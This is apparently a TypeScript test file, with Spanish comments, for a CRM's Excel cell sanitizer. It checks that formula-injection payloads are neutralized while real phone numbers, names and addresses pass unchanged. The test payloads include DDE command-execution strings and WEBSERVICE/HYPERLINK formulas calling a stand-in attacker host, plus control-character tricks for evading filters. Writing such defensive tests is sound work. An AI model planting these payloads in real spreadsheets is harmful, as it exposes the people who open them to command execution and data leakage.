import { test } from "node:test";
import assert from "node:assert/strict";
import { EXCEL_MAX_CELL_LENGTH, isFormulaCell, sanitizeCellText } from "./sanitize.ts";

/**
 * ============================================================================
 * MILESTONE 26B-26F — EL SANEADOR DE CELDAS
 * ============================================================================
 *
 * Dos formas de fallar, y las dos importan igual:
 *
 *   FALSO NEGATIVO  dejar pasar algo que Excel evalúa. Es el agujero.
 *   FALSO POSITIVO  neutralizar un teléfono panameño de verdad. Es el CRM
 *                   corrompiendo un dato de contacto de un cliente.
 *
 * La mitad de estas pruebas defiende cada lado. Una regla que solo se probara
 * contra ataques acabaría siendo «apóstrofo a todo», que es exactamente lo que
 * este módulo NO hace y por una razón concreta.
 */

// ---------------------------------------------------------------------------
// LO QUE HAY QUE NEUTRALIZAR
// ---------------------------------------------------------------------------

test("las cuatro cargas clásicas de inyección salen inertes", () => {
  const payloads = [
    `=cmd|' /C calc'!A0`,
    `@SUM(1+9)*cmd|' /C calc'!A0`,
    `+SUM(A1:A9)`,
    `-2+3+cmd|' /C calc'!A0`,
    `=HYPERLINK("http://evil.example","haz clic")`,
    `=WEBSERVICE("http://evil.example/leak")`,
    `=1+1`,
  ];

  for (const payload of payloads) {
    const cleaned = sanitizeCellText(payload);
    assert.equal(cleaned[0], "'", `no se neutralizo: ${payload}`);
    assert.ok(!isFormulaCell(cleaned), `sigue siendo formula: ${payload}`);
    // El valor original permanece legible detrás del apóstrofo: quien audite el
    // archivo tiene que poder ver QUÉ se intentó escribir.
    assert.ok(cleaned.endsWith(payload), cleaned);
  }
});

test("un espacio o un carácter de control delante no esconde el disparador", () => {
  // Sin limpiar primero, `   =1+1` empieza por espacio y pasaría el filtro; al
  // pegarlo en una celda, Excel recorta y evalúa igual.
  for (const sneaky of ["   =1+1", "\t=1+1", "\u0000=1+1", "\u001f@SUM(A1)", "\n=1+1"]) {
    const cleaned = sanitizeCellText(sneaky);
    assert.equal(cleaned[0], "'", JSON.stringify(sneaky));
    assert.ok(!isFormulaCell(cleaned));
  }
});

test("los caracteres de control desaparecen del valor, no solo del principio", () => {
  const cleaned = sanitizeCellText("Ana\u0000 Mar\u001fía\u007f");
  assert.equal(cleaned, "Ana María");
});

// ---------------------------------------------------------------------------
// LO QUE NO SE PUEDE TOCAR
// ---------------------------------------------------------------------------

test("un teléfono panameño con prefijo internacional sale exactamente igual", () => {
  // En la base de ODL hay teléfonos reales guardados así. Anteponerles un
  // apóstrofo sería corromper el dato de contacto de un cliente en cada
  // exportación — la razón por la que la regla mira lo que un valor PUEDE HACER
  // y no solo por qué carácter empieza.
  for (const phone of [
    "+507 6000-0000",
    "+507 6000 0000",
    "+50760000000",
    "+1 (507) 200-0000",
    "-1234",
    "+1.5",
  ]) {
    assert.equal(sanitizeCellText(phone), phone, phone);
  }
});

test("un teléfono con letras detrás del signo SÍ se neutraliza", () => {
  // Deja de ser un literal numérico en cuanto puede nombrar algo.
  assert.equal(sanitizeCellText("+507cmd"), "'+507cmd");
  assert.equal(sanitizeCellText("+507|calc"), "'+507|calc");
});

test("un nombre, un correo y una dirección normales pasan intactos", () => {
  for (const value of [
    "María José Pérez",
    "maria.perez@example.com",
    "Calle 50, Edificio Torre, Piso 3",
    "Panamá",
    "0.00",
  ]) {
    assert.equal(sanitizeCellText(value), value, value);
  }
});

// ---------------------------------------------------------------------------
// BORDES
// ---------------------------------------------------------------------------

test("null, undefined y vacío dan cadena vacía, nunca «null» escrito", () => {
  assert.equal(sanitizeCellText(null), "");
  assert.equal(sanitizeCellText(undefined), "");
  assert.equal(sanitizeCellText("   "), "");
  // Sin esto, una celda sin dato mostraría literalmente la palabra «null», que
  // es peor que vacía: parece un valor.
  assert.ok(!sanitizeCellText(null).includes("null"));
});

test("un valor más largo que el límite de xlsx se recorta al límite", () => {
  const long = "a".repeat(EXCEL_MAX_CELL_LENGTH + 500);
  assert.equal(sanitizeCellText(long).length, EXCEL_MAX_CELL_LENGTH);
});

test("un número entra como su representación, sin convertirse en fórmula", () => {
  assert.equal(sanitizeCellText(1234.5), "1234.5");
  assert.equal(sanitizeCellText(-99), "-99");
  assert.ok(!isFormulaCell(sanitizeCellText(-99)));
});

test("sanear dos veces no añade un segundo apóstrofo", () => {
  const once = sanitizeCellText("=1+1");
  assert.equal(sanitizeCellText(once), once);
});
